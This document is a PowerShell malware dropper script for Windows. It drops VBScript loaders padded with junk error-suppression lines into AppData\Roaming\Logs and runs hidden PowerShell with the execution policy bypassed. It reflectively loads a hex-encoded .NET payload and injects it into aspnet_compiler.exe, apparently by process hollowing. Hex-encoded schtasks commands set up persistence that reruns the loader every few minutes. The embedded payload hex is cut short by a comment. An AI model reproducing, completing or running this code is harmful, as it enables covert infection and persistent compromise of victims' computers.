$xa = "$env:USERPROFILE\AppData\Roaming\Logs"
New-Item $xa -ItemType Directory -Force
$Content = @'
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
set A = CreateObject("WScript.Shell")
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
A.run "powershell -ExecutionPolicy Bypass iex([IO.File]::ReadAllText('%USERPROFILE%\AppData\Roaming\Logs\Report.ps1'))",0
'@
[IO.File]::WriteAllText("$env:USERPROFILE\AppData\Roaming\Logs\Loader.vbs", $Content)
$Content = @'
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
set A = CreateObject("WScript.Shell")
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
A.run "powershell -ExecutionPolicy Bypass iex([IO.File]::ReadAllText('%USERPROFILE%\AppData\Roaming\Logs\install.ps1'))",0
'@
[IO.File]::WriteAllText("$env:USERPROFILE\AppData\Roaming\Logs\install.vbs", $Content)
$Content = @'
Try{
function x {
param($JHX367)$JHX367 = $JHX367 -split '(..)' | ? { $_ }
ForEach ($UX2 in $JHX367){[Convert]::ToInt32($UX2,16)}}
[byte[]] $MyS  = x('4D5A9...000') # The omitted '4D5A9...000' is actually a 658433 character long string.
[byte[]] $serv  = x('4D5A9...000') # The omitted '4D5A9...000' is actually a 124929 character long string.
}catch{}
Try{
$x = [<#0.0.000.0#>Reflection.Assembly<#0.0.000.0#>]<#0.0.000.0#>}catch{<#0.0.000.0#>}
Try{
$load = 'Load'}catch{<#0.0.000.0#>}
Try{
$JHX367 = 'NewPE2.PE'}catch{}
Try{
$h = $x::$load($MyS).GetType($JHX367)}catch{}
Try{
Start-Sleep 1
$k = 'Execute'}catch{}
Try{
$o = $h.'GetMethod'($k)}catch{}
Try{
Start-Sleep 3
$Z = 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe'}catch{}
Try{
Start-Sleep 1
$C = [<#0.0.000.0#><#0.0.000.0#><#0.0.000.0#><#0.0.000.0#><#0.0.000.0#><#0.0.000.0#><#0.0.000.0#><#0.0.000.0#><#0.0.000.0#><#0.0.000.0#><#0.0.000.0#><#0.0.000.0#><#0.0.000.0#><#0.0.000.0#><#0.0.000.0#>OBJECT<#0.0.000.0#>[<#0.0.000.0#>]<#0.0.000.0#>]<#0.0.000.0#>}catch{<#0.0.000.0#>}
Try{
$hh = $null,{<#0.0.000.0#>$C<#0.0.000.0#>}}catch{}
Try{
$o.Invoke(<#0.0.000.0#>$hh<#0.0.000.0#>, ($Z,$serv))}catch{}
schtasks /delete /tn det /f
'@
[IO.File]::WriteAllText("$env:USERPROFILE\AppData\Roaming\Logs\Report.ps1", $Content)
function go {
param($Y6c)$Y6c = $Y6c -split '(..)' | ? { $_ }
ForEach ($chrome in $Y6c){[Convert]::ToInt32($chrome,16)}}
[byte[]] $bytes2  = go('747279200D0A7B0D0A7363687461736B732E657865202F637265617465202F746E20646574202F7363206D696E75746520202F73742030303A3130202F74722024656E763A5553455250524F46494C455C417070446174615C526F616D696E675C4C6F67735C4C6F616465722E7662730D0A0D0A7363687461736B732E657865202F637265617465202F746E2061646D696E6973746172746F72202F5343206D696E757465202F4D4F2033202F74722024656E763A5553455250524F46494C455C417070446174615C526F616D696E675C4C6F67735C4C6F616465722E7662730D0A7D206361746368207B207D')
[io.file]::WriteAllBytes("$env:USERPROFILE\AppData\Roaming\Logs\install.ps1",$bytes2)
Start-Sleep 6
start "$env:USERPROFILE\AppData\Roaming\Logs\install.vbs"